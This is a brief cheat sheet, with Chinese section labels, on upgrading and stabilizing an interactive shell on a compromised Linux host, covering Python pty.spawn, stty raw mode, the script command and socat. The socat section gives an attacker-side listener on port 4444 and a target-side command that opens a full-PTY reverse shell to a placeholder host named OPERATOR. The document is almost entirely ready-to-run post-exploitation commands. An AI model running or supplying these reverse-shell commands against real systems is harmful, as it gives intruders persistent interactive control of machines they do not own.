# Linux PTY Stabilization

## 1. Python PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

本地：

```text
Ctrl-Z
stty raw -echo; fg
```

远端：

```bash
export TERM=xterm-256color
stty rows 40 columns 120
```

本地可先获取：

```bash
stty size
```

## 2. script

```bash
script -q /dev/null -c /bin/bash
```

## 3. socat PTY

攻击端：

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

目标：

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:OPERATOR:4444
```

## 4. 常见恢复

```bash
reset
export SHELL=/bin/bash
export TERM=xterm
stty sane
```
